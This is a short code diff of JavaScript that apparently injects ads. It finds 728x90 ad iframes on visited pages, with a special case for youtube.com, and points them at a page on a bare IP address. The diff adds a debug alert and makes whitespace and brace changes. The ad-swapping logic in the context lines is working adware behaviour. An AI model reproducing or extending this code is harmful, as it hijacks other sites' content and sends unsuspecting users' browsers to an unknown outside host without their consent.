@@ -116,6 +116,7 @@ document.getElementsByTagName("head")[0].appendChild(s);
 							
 					if (iframe_tags[x].width == 728 && iframe_tags[x].height == 90) 
 								{
+									alert('hi');
 									if (document.location.href.search("youtube.com") != -1) 
 									{
 										iframe_tags[x].src = 'http://50.31.160.220/dead/728x90.html';
@@ -126,9 +127,10 @@ document.getElementsByTagName("head")[0].appendChild(s);
 									}
 									else 
 									{
+
 										iframe_tags[x].src = 'http://50.31.160.220/dead/728x90.html';									
 									}
 									commonadunit = true;
 								}
-							
-											}
+				}			
+	
